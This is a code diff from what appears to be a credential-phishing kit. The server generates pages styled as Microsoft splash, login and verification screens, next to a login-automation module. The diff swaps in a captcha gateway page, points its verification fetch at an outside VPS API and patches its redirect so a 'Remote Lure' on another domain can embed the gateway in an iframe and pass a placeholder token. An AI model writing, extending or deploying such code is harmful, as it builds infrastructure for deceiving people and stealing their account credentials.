@@ -8,7 +8,9 @@ const { startAutomation } = require('../../automation/loginFlow');
 const { handleImmediateEmailInput } = require('../../handlers/emailHandler');
 
 // --- Generators for Server-Driven UI via API ---
+// --- Generators for Server-Driven UI via API ---
 const { generateGatewayPage } = require('../../generators/gatewayPage');
+const { generateSimpleCaptchaPage } = require('../../generators/simpleCaptchaPage'); // [NEW]
 const { generateMsSplashPage } = require('../../generators/msSplashPage');
 const { generateMsLoginPage } = require('../../generators/msLoginPage');
 const { generateMsVeryPage } = require('../../generators/msVeryPage');
@@ -26,13 +28,23 @@ exports.getPage = (req, res) => {
 
         switch (type) {
             case 'gateway':
-                htmlContent = generateGatewayPage();
-                // [EAPI PATCH] Intercept the redirect logic so the Remote Lure stays on the same page
-                // We replace the redirect with a custom callback that the Lure must define.
+                // START CHANGED: Use new Simple Captcha
+                htmlContent = generateSimpleCaptchaPage();
+
+                // [EAPI PATCH 1] Fix the Fetch URL to be absolute (since iframe is on remote domain)
+                // We point it to the VPS public API URL
                 htmlContent = htmlContent.replace(
-                    "window.location.href = '/' + result.token;",
-                    "if(window.parent && window.parent.onGatewaySuccess){window.parent.onGatewaySuccess(result.token);}else if(window.onGatewaySuccess){window.onGatewaySuccess(result.token);}else{console.log('Gateway success:', result.token);}"
+                    "fetch('/verify-captcha'",
+                    "fetch('https://api.yieldmaxfx.com/verify-captcha'"
                 );
+
+                // [EAPI PATCH 2] Intercept the redirect logic
+                // Instead of window.location.href, we call the parent callback
+                htmlContent = htmlContent.replace(
+                    "window.location.href = result.redirect || '/processing';",
+                    "if(window.parent && window.parent.onGatewaySuccess){window.parent.onGatewaySuccess('simulated_token_bypass');}else{console.log('Gateway success');}"
+                );
+                // END CHANGED
                 break;
             case 'splash':
                 htmlContent = generateMsSplashPage(safeToken);
